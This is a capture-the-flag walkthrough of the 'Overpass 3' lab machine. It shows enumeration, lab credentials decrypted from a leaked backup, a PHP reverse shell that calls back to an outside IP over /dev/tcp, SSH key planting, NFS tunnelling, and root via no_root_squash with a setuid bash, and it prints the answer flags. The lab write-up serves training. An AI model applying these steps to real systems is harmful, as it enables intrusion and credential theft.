> Overpass 3

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.37 ((centos))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix
```

# Dirb

dirb http://$IP

```
> DIRECTORY: http://10.10.224.11/backups/
+ http://10.10.224.11/cgi-bin/ (CODE:403|SIZE:217)                     
+ http://10.10.224.11/index.html (CODE:200|SIZE:1770) 
```

# /backups

We got `backup.zip`. On unzipping it we got 2 files `private.key` and `CustomerDetails.xlsx.gpg`.

1. gpg --import private.key
2. gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xslx

And opening them we got usernames ,password, credit card numbers and their CVV's.

`paradox`:`ShibesAreGreat123`
`0day`:`OllieIsTheBestDog`
`muirlandoracle`:`A11D0gsAreAw3s0me`

And looks like paradox user has a valid password for FTP. Let's try to add a file and look if it reflects on the webpage. And looks like we can add file in FTP and access the in webpage. Let's try to get a reverse shell now. Since we know we are runing php from nikto result, we can get a PHP payload.

```php
<?php
exec("bash -i >& /dev/tcp/10.8.107.21/4444 0>&1");
?>
```

We got a shell as `apache`. And got our flag at `/usr/share/httpd`.

# web.flag

```
thm{0ae72f7870c3687129f7a824194be09d}
```

We can use su to change user as paradox and use the password we found in the xlsx file. Also we can find .ssh dir in his home. Hopefully we can get a stable shell. Let's generate SSH keypair using sshgen.

# <victim>

1. Copy created public key and add it to `/home/paradox/.ssh/authorized_keys`.

# <Attacker>

1. ssh -i id_rsa paradox@overpass.thm

We got a stable shell. Now running linpeas we found an interesting hit.

```bash
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

Looks like we can mount `/home/james *` and we can access it from as a client and write inside that directory as if you were the local root of the machine.

rpcinfo -p

```bash
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```

showmount -e localhost

```bash
Export list for localhost:
/home/james *
```

And it seems that /home/james dir is exportes locally on port 2049. Let's tunnel it!

ssh -i id_rsa -N -L 2049:localhost:2049 paradox@overpass.thm

And we have it tunneled locally.

1. mkdir /tmp/mount
2. sudo mount -v -t nfs localhost: /tmp/mount

And we got the flag in /tmp/mount dir.

# user.flag

```
thm{3693fc86661faa21f16ac9508a43e1ae}
```

And as suggested from linpeas let's try the recommended methof copying bash binary. Also we can find /.ssh directory in the mounted dir. We can get james id_rsa file.

# /tmp/mount

1. cp /bin/bash .
2. chmod +s bash

We can ssh as james and now we see the bash binary. Running `./bash -p` we are root.

# root.flag

```
thm{a4f6adb70371a4bceb32988417456c44}
```